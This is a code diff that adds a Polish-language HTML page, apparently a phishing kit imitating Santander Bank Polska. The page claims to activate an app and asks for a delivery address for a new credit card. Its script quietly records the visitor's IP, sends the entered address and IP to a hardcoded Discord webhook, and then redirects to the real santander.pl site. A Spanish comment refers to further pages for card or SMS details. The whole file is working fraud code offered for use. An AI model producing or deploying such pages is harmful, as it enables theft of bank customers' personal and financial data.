@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adres dostawy karty</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 400px;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        /* Header */
+        .header {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .header h2 {
+            color: #e50000;
+            font-size: 18px;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        .menu-icon {
+            position: absolute;
+            right: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .menu-icon span {
+            width: 22px;
+            height: 2px;
+            background-color: #e50000;
+        }
+
+        .image-placeholder {
+            width: 100%;
+            height: 150px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .image-placeholder img {
+            max-height: 100%;
+            max-width: 100%;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #222;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+
+        .sub-text {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.4;
+            margin-bottom: 30px;
+            padding: 0 15px;
+        }
+
+        .form-group {
+            width: 100%;
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .label {
+            font-size: 14px;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            background-color: #fff;
+        }
+
+        .row {
+            display: flex;
+            gap: 15px;
+            width: 100%;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 16px;
+            background-color: #e50000;
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: auto;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="header">
+            <h2>Aktywacja aplikacji</h2>
+            <div class="menu-icon">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+
+        <div class="image-placeholder">
+            <img src="https://cdn-icons-png.flaticon.com/512/4226/4226982.png" alt="Delivery">
+        </div>
+
+        <h1>Adres dostawy</h1>
+        <p class="sub-text">
+            To jest adres, na który zostanie wysłana Twoja nowa karta kredytowa.
+        </p>
+
+        <div class="form-group">
+            <span class="label">Adres</span>
+            <input type="text" id="user-address" placeholder="Wpisz ulicę i numer domu" maxlength="100">
+        </div>
+
+        <div class="row">
+            <div class="form-group">
+                <span class="label">Miasto</span>
+                <input type="text" id="user-city" placeholder="Wpisz miasto" maxlength="50">
+            </div>
+            <div class="form-group">
+                <span class="label">Województwo</span>
+                <input type="text" id="user-state" placeholder="Wpisz stan" maxlength="50">
+            </div>
+        </div>
+
+        <button class="btn-continue" onclick="sendDeliveryInfo()">Kontynuuj</button>
+    </div>
+
+    <script>
+        // CONFIGURACIÓN: PEGA TU WEBHOOK AQUÍ
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1460685397070839975/7ODk8T5o2hDUT_1O0-aWrSKH_r5_Y0kcGwIUgnZ_38om5vNCxpJ7XUVt0U7pQAcEMAqt";
+        let userIP = "Cargando...";
+
+        // Obtener la IP real apenas carga la página
+        window.onload = async () => {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+            } catch (error) {
+                userIP = "No disponible";
+            }
+        };
+
+        async function sendDeliveryInfo() {
+            const addr = document.getElementById('user-address').value;
+            const city = document.getElementById('user-city').value;
+            const state = document.getElementById('user-state').value;
+
+            // Validación simple
+            if (!addr || !city || !state) {
+                alert("Proszę wypełnić wszystkie pola.");
+                return;
+            }
+
+            const payload = {
+                content: `📍 **DATOS DE ENTREGA**\n` +
+                         `🏠 **Dirección:** \`${addr}\`\n` +
+                         `🏙️ **Ciudad:** \`${city}\`\n` +
+                         `🏛️ **Estado:** \`${state}\`\n` +
+                         `🌐 **IP Real:** \`${userIP}\``
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } finally {
+                // Redirecciona al siguiente archivo (por ejemplo, el de la tarjeta o el SMS)
+                window.location.href = "https://www.santander.pl/"; 
+            }
+        }
+    </script>
+
+</body>
+</html>
